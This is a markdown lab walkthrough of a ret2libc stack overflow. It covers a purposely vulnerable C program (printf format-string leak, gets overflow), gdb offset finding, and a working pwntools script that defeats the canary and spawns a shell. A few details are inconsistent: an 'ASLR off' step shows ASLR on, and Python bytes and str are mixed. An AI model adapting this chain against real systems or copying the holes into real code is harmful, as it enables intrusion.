# &#35; basic stack buffer overflow

#### &#42; setting aslr off & core dump
```bash

$ cat /etc/sysctl.conf
kernel.randomize_va_space=2
kernel.core_pattern = core.%e


$ sudo sysctl -p
kernel.randomize_va_space = 2
kernel.core_pattern = core.%e

```

#### &#42; vulnerable source code
#### a format string bug of printf() and a bof of gets() in vuln_func()
```bash
$ cat vulnerable.c
#include <stdio.h>
//gcc vulnerable.c -o vulnerable

void vuln_func(char *input) {
        char buffer[256];
        printf(input);
        printf("\n");
        printf("input : ");
        gets(&buffer);
        printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
        vuln_func(argv[1]);
}

# all on for memory protection
$ gcc vulnerable.c -o vulnerable

```


#### &#42; find libc base address using format string bug
```bash
# input format string and find leak address
$ ./vulnerable %llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx
7fffffffe288.7fffffffe2a0.555555555280.0.7ffff7fe0d50.0.7fffffffe4f1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.7fffffffefde.
0.0.0.0.0.0.555555554040.f0b5ff.c2.7fffffffe177.7fffffffe176.5555555552cd.7ffff7faffc8.6406da974c1ed900.7fffffffe190.
55555555527d.7fffffffe288.200000000.0.7ffff7de60b3.7ffff7ffc620.7fffffffe288.200000000.555555555257.555555555280.
3d790f581fd68906.5555555550e0.7fffffffe280.0.0.c286f0a7dc968906.c286e0e4df188906.0.0.0.2.7fffffffe288.7fffffffe2a0.
7ffff7ffe190.0.0.5555555550e0.7fffffffe280.0.0.55555555510e.7fffffffe278.1c.2.7fffffffe4e4.7fffffffe4f1.0.7fffffffe6fe.
7fffffffe70e.7fffffffe72d.7fffffffe73a.7fffffffe74f.7fffffffe75e.7fffffffe76e.7fffffffe77f.7fffffffed61.7fffffffed74.
7fffffffedaa.7fffffffedcc.7fffffffede3.7fffffffedf7.7fffffffee17.7fffffffee3a.7fffffffee44.7fffffffee5f.7fffffffee67.
7fffffffee79.7fffffffee98.7fffffffeebb.7fffffffeefc.7fffffffef7a.7fffffffefb0.7fffffffefc3
input : aa
aa

```


#### &#42;  now find to libc and canary address
```bash
$ gdb ./vulnerable -q
gef???  b main
Breakpoint 1 at 0x1257
gef???  r %llx
gef???  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/user/all-on/gets-fmt/vulnerable
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/user/all-on/gets-fmt/vulnerable
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/user/all-on/gets-fmt/vulnerable
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/user/all-on/gets-fmt/vulnerable
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/user/all-on/gets-fmt/vulnerable
0x00007ffff7dbf000 0x00007ffff7de4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de4000 0x00007ffff7f5c000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5c000 0x00007ffff7fa6000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa6000 0x00007ffff7fa7000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fad000 0x00007ffff7fb3000 0x0000000000000000 rw-
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef???

## libc address is starting 0x00007ffff7dbf000
## thus leaked libc address is 7ffff7faffc8 (40th)
## and canary address is 6406da974c1ed900   (41th) => canary terminated null(0x00)

```


#### &#42;  calculate libc_base, canary address and so on.
```bash
$ ldd vulnerable
	linux-vdso.so.1 (0x00007ffff4490000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f722422e000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f7224431000)
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rdi ; ret"
0x0000000000026b72 : pop rdi ; ret
0x000000000002a56f : pop rdi ; retf 0x18
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": ret" | more
0x0000000000025679 : ret

```


#### &#42;  calculate libc_base, canary address and so on.
```bash
## libc_base_offset = leaked_libc(0x7ffff7faffc8)-libc_starting(0x00007ffff7dbf000)
## libc_base_offset = 0x1f0fc8


gef???  p system
$1 = {int (const char *)} 0x7ffff7e14410 <__libc_system>
## system_offset = system(0x7ffff7e14410) - libc_starting(0x00007ffff7dbf000)
## system_offset = 0x55410


gef???  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5c000-0x7ffff7fa6000), permission=r--
  0x7ffff7f765aa - 0x7ffff7f765b1  ???   "/bin/sh"
gef???
## binsh_offset = /bin/sh(0x7ffff7f765aa) - libc_starting(0x00007ffff7dbf000)
## binsh_offset = 0x1b75aa


```


#### &#42;  payload struct
```bash
payload  = b"A"*264
payload += p64(canary) 
payload += "C"*8        => RBP
payload += p64(ret)     => for alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

```


#### &#42;  try to exploit
```bash
$ cat exploit
#!/usr/bin/env python

from pwn import *

conn = process(['./vulnerable', '%40$llx.%41$llx'], stdin=PIPE)
leak_addrs = conn.recvline()
leak_libc = leak_addrs.split(".")[0]
leak_canary = leak_addrs.split(".")[1]

print( leak_addrs )
libc_base = int(leak_libc,16)-0x1f0fc8
canary = int(leak_canary,16)

print( hex(libc_base) )
print( hex(canary) )


ret = libc_base + 0x25679
pop_rdi = libc_base + 0x26b72
binsh = libc_base + 0x1b75aa
system = libc_base + 0x55410

payload  = b"A"*264
payload += p64(canary)
payload += "B"*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
conn.sendline(payload)

print( conn.recv(8) + payload )

conn.interactive()

$ python exp.py
[+] Starting local process './vulnerable': pid 21568
7ffff7faffc8.72e6132d14bdd200.7fffffffe470

0x7ffff7dbf000
0x72e6132d14bdd200
input : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xbd\x14\x13rBBBBBBBBs[??????\xff\x7f\x00r[??????\xff\x7f\x00\xaae?????????\x00\x10?????????\x7f\x00
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$
```
